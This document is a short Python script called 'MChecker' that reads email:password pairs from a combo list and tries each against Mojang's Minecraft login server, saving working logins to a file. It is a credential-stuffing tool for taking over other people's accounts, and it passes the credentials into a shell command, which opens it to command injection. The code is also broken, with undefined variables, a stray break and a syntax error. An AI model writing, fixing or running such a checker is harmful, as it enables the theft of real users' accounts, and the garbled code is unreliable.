import requests,sys,subprocess as sp

RED = '\033[1;31m'
GREEN = '\033[0;32m'
DARK_RED = '\033[0;31m'
WHITE = '\033[1;37m'
CYAN = '\033[0;36m'
ITALIC = '\033[3m'
END = '\033[0m'
combolist = sys.argv[1]
output = f'{RED}[{WHITE}MChecker{RED}]'

try:
	accs = open(combolist, 'r+')
except IndexError:
	print(f'{output} Wrong Usage! Correct Usage {WHITE}>> {CYAN}python mchecker.py {ITALIC}file_name.txt{END}')
	sys.exit()

Combos = accs.readlines()
emailList = list()
passList = list()

for combo in Combos:
	EmailTW = combo.split(':')[0]
	EmailTW = EmailThrowaway.replace('\n', '')
	emailList.append(EmailThrowaway)
	PasswdTW = combo.split(':')[1]
	PasswdTW = PasswordThrowaway.replace('\n', '')
	passList.append(PasswordThrowaway)

print(f'{output} Check{CYAN} {len(emailList)} {RED}account(s) from {combolist}?')
input1 = input('[y/n] --> ')
if input1 == 'n':
	break
else:
	pass

for _ in range (len(emailList)):
	try:
		r = requests.post('https://authserver.mojang.com/authenticate' json={'agent': {'name': 'Minecraft', 'version': 1}, 'username': emailList[i], 'password': passList[i]})
		if r.status_code == 200:
			print(f'{output} Found {GREEN}VALID{RED} Account!')
			sp.run(f'echo {emailList[i]}:{passList[i]}\n >> alts.txt', shell=True)
		else:
			print(f'{output} Found {DARK_RED}INVALID{RED} Account!')
	except KeyboardInterrupt:
		print(f'{output} Thanks For Using MChecker! :) (Made by: Stoner#6329)')
		break